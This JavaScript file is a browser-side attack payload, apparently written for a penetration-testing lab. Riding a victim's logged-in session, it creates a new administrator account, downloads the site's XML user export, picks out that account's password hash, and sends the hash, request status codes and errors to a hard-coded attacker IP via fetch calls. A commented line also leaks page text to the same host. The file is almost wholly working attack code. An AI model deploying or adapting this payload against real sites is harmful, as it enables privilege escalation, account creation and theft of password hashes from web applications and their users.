const attacker_ip = '192.168.119.123';
/*var h1s = document.getElementsByTagName("h1");
fetch(`http://${attacker_ip}/`+h1s[1].textContent, {});
*/
const host = 'answers';
const host_ip = '192.168.123.251';

username = "zinhart"
email = "zinhart@cucked.com"
isAdmin = "true"
isMod = "true"
let config = {
      "method":"POST",
      "credentials":"include",
      mode: "cors",
      headers: {
            "Content-Type": "application/x-www-form-urlencoded"
      },
      body: "name=" + encodeURIComponent(username) + "&email=" + encodeURIComponent(email) + "&isAdmin=" + encodeURIComponent(isAdmin) + "&isMod=" + encodeURIComponent(isMod)
  };

// Create an Admin user and seed values to crack the users password
doRequest(`http://${host_ip}/admin/users/create`, config);


/*fetch(`http://answers/admin/export`,config).then(async (response) => {let temp = await response.text(); parser = new DOMParser();
xmlDoc = parser.parseFromString(temp,"text/xml"); console.log(xmlDoc.getElementsByTagName("user")[8].childNodes[2].tagName); console.log(xmlDoc.getElementsByTagName("user")[8].childNodes[2].innerHTML);});
*/
// Export the DataBase
config = {
  "method":"GET",
  "credentials":"include",
  mode: "cors",
  headers: {
        "Content-Type": "application/xml"
  },
};
extractHash(`http://${host_ip}/admin/export`, config);


// Helper Functions
// very basic
function doRequest(endpoint, cfg) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(`http://${attacker_ip}/?endpoint=` + endpoint, {
      mode: "cors",
      });   
      fetch(`http://${attacker_ip}/?status_code=` + response.status, {
      mode: "cors",
      });
  if(response.status < 400) {
      let data = await response.text();
      fetch(`http://${attacker_ip}/?exfil=` + data.length, {
      mode: "cors",
      });
  }
  }).catch((error) => {
      fetch(`http://${attacker_ip}/?error=` + error, {
      mode: "cors",
      });   
  });
}

// extract hash
function extractHash(endpoint, cfg) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(`http://${attacker_ip}/?endpoint=` + endpoint, {
      mode: "cors",
      });   
      fetch(`http://${attacker_ip}/?status_code=` + response.status, {
      mode: "cors",
      });
  if(response.status < 400) {
      let xml_string = await response.text();
      let parser = new DOMParser();
      let xmlDoc = parser.parseFromString(xml_string,"text/xml");
      let users = xmlDoc.getElementsByTagName("user");
      let hash='';
      for(let i = 0; i < users.length; ++i) {
        if(users[i].childNodes[1].tagName === 'username') {
          if(users[i].childNodes[1].innerHTML === username) {
            hash = users[i].childNodes[2].innerHTML;
          }
        }
      }
      console.log(xmlDoc.getElementsByTagName("user")[8].childNodes[2].tagName);
      console.log(xmlDoc.getElementsByTagName("user")[8].childNodes[2].innerHTML);
      fetch(`http://${attacker_ip}/?exfil=hash&value=` + hash, {
      mode: "cors",
      });
  }
  }).catch((error) => {
      fetch(`http://${attacker_ip}/?error=` + error, {
      mode: "cors",
      });   
  });
}